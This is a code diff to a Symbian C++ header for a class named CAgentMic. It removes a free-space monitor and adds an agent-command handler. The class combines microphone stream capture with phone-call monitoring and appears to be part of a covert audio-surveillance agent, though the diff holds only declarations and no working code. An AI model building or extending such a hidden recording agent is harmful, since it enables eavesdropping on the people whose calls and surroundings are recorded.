@@ -19,7 +19,6 @@
 #include "AbstractAgent.h"
 #include "AdditionalDataStructs.h"
 #include "SlimMonitorPhoneCall.h"
-#include "MonitorFreeSpace.h"
 #include <MdaAudioInputStream.h>
 #include <mda\common\audio.h>
 #include <mmf\common\mmfutilities.h>
@@ -33,7 +32,7 @@
  *  CAgentMic
  * 
  */
-class CAgentMic : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MSlimCallMonCallBack, public MTimeOutNotifier, public MFreeSpaceCallBack
+class CAgentMic : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MSlimCallMonCallBack, public MTimeOutNotifier
 	{
 public:
 	// Constructors and destructor
@@ -58,6 +57,7 @@ protected:
 	// From AbstractQueueEndPoint
 	virtual void StartAgentCmdL();
 	virtual void StopAgentCmdL();
+	virtual void NotifyAgentCmdL(TUint32 aData);
 		
 private:
 	
@@ -77,10 +77,6 @@ private:
 	virtual void NotifyDialling();
 	virtual void NotifyRinging();
 
-	// From MFreeSpaceCallBack
-	virtual void NotifyAboveThreshold();
-	virtual void NotifyBelowThreshold();
-	
 	// From MTimeOutNotifier
 	virtual void TimerExpiredL(TAny* src);
 	    
@@ -132,14 +128,9 @@ private: // data members
 	// Frames counter
 	TInt iFramesCounter;
 	
-	//TBool iErrDied;    //TODO: verify and delete when no more needed
-	//TInt iStreamCounter;  //TODO: verify and delete when no more needed
-	//TBool iInCall;
-	
 	TMicAdditionalData iMicAdditionalData;  
 	
-	CFreeSpaceMonitor*		iFreeSpaceMonitor;
-	TBool  iBelowQuota;
+	TBool  					iBelowFreespaceQuota;
 	CSlimPhoneCallMonitor*	iCallMonitor;
 	CTimeOutTimer* 	iTimer;
 	
